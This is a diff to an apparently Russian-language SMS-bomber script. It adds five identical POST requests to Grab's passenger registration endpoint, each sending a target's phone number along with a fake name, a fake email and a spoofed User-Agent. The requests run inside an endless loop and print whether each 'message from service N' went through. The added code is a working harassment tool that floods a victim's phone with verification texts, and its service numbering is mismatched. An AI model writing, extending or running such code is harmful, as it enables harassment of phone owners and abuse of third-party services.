@@ -106,7 +106,32 @@ def infinity():
     if(rGRAB.status_code == 200):
       print(colored('Сообщение от сервиса №5 отправлено!','green'))
     else:
+      print(colored('Сообщение от сервиса №6 не отправлено','red'))
+    rGRAB5 = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
+    if(rGRAB5.status_code == 200):
+      print(colored('Сообщение от сервиса №6 отправлено!','green'))
+    else:
       print(colored('Сообщение от сервиса №5 не отправлено','red'))
+    rGRAB4 = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
+    if(rGRAB4.status_code == 200):
+      print(colored('Сообщение от сервиса №7 отправлено!','green'))
+    else:
+      print(colored('Сообщение от сервиса №7 не отправлено','red'))
+    rGRAB3 = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
+    if(rGRAB3.status_code == 200):
+      print(colored('Сообщение от сервиса №8 отправлено!','green'))
+    else:
+      print(colored('Сообщение от сервиса №8 не отправлено','red'))
+    rGRAB2 = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
+    if(rGRAB2.status_code == 200):
+      print(colored('Сообщение от сервиса №9 отправлено!','green'))
+    else:
+      print(colored('Сообщение от сервиса №9 не отправлено','red'))
+    rGRAB1 = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data = {'phoneNumber':phone[1:], 'countryCode':'ID','name':'Alexey','email':'alexey173949@gmail.com', 'deviceToken':'*'}, headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
+    if(rGRAB1.status_code == 200):
+      print(colored('Сообщение от сервиса №10 отправлено!','green'))
+    else:
+      print(colored('Сообщение от сервиса №10 не отправлено','red'))
 a = True
 def mv():
 	while True:
